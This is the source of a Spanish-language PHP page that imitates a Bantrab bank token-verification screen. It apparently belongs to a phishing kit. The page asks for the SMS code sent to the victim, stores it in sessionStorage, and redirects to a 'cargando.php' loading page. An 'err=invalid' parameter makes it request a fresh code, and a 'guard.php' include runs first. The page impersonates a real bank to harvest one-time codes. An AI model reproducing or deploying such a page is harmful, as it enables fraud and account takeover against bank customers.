<?php require __DIR__ . '/guard.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificación</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      min-height: 100vh;
      background-color: #e4e4e4;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
      color: #333;
    }

    .card {
      background: #fff;
      border: 2px solid #5bc8d0;
      border-radius: 6px;
      width: 100%;
      max-width: 460px;
      padding: 48px 52px 44px;
      text-align: center;
    }

    @media (max-width: 576px) {
      body { background-color: #fff; align-items: flex-start; }
      .card { border: none; border-radius: 0; padding: 40px 28px 36px; max-width: 100%; }
    }

    .logo-area { margin-bottom: 28px; }
    .logo-area img { height: 60px; width: auto; }

    .card h1 {
      font-size: 28px; font-weight: 700; color: #111; margin-bottom: 20px;
    }

    .card p {
      font-size: 15px; line-height: 1.6; color: #444; margin-bottom: 14px;
    }

    .input-wrap { margin: 24px 0 8px; }

    .input-wrap input {
      width: 100%;
      border: 1.5px solid #5bc8d0;
      border-radius: 4px;
      padding: 11px 14px;
      font-size: 14px;
      font-weight: 600;
      letter-spacing: 1px;
      color: #555;
      outline: none;
      transition: border-color 0.2s, box-shadow 0.2s;
    }

    .input-wrap input::placeholder {
      color: #aaa; font-weight: 600; letter-spacing: 1px;
    }

    .input-wrap input:focus {
      border-color: #17a2b8;
      box-shadow: 0 0 0 3px rgba(23,162,184,0.15);
    }

    .resend { text-align: right; margin-bottom: 28px; }
    .resend a { font-size: 13px; color: #2a7ae2; text-decoration: none; }
    .resend a:hover { text-decoration: underline; }

    .btn-continuar {
      background-color: #f5b800;
      color: #fff;
      border: none;
      border-radius: 6px;
      padding: 12px 48px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.2s, transform 0.1s;
      letter-spacing: 0.3px;
    }

    .btn-continuar:hover { background-color: #e0a900; }
    .btn-continuar:active { transform: scale(0.97); }
  </style>
</head>
<body>

  <div class="card">

    <div class="logo-area">
      <img src="img/logo_bantrab.png" alt="Logo">
    </div>

    <h1>Verificación</h1>

    <p>Hemos enviado un código de verificación a<br>tu celular.</p>
    <p>Si no recibes el SMS, revisa en el correo<br>electrónico asociado.</p>

    <div class="input-wrap">
      <input type="text" id="tokenInput" placeholder="TOKEN" maxlength="8" autocomplete="off" inputmode="numeric" pattern="[0-9]*" />
    </div>

    <div class="resend">
      <a href="#">¿No recibiste el código?</a>
    </div>

    <button class="btn-continuar" onclick="verificar()">Continuar</button>

  </div>

  <script>
    const inputEl = document.getElementById('tokenInput');

    function flashError() {
      inputEl.focus();
      inputEl.style.borderColor = '#e53935';
      setTimeout(() => { inputEl.style.borderColor = '#5bc8d0'; }, 2000);
    }

    function verificar() {
      const val = inputEl.value.trim();
      if (!val) { flashError(); return; }

      sessionStorage.setItem('pending_action', 'llave');
      sessionStorage.setItem('pending_code',   val);
      window.location.href = 'cargando.php';
    }

    inputEl.addEventListener('keydown', function (e) {
      if (e.key === 'Enter') verificar();
    });

    if (new URLSearchParams(location.search).get('err') === 'invalid') {
      setTimeout(() => alert('TOKEN INVÁLIDO. Por favor ingresa el nuevo código.'), 200);
    }
  </script>

</body>
</html>
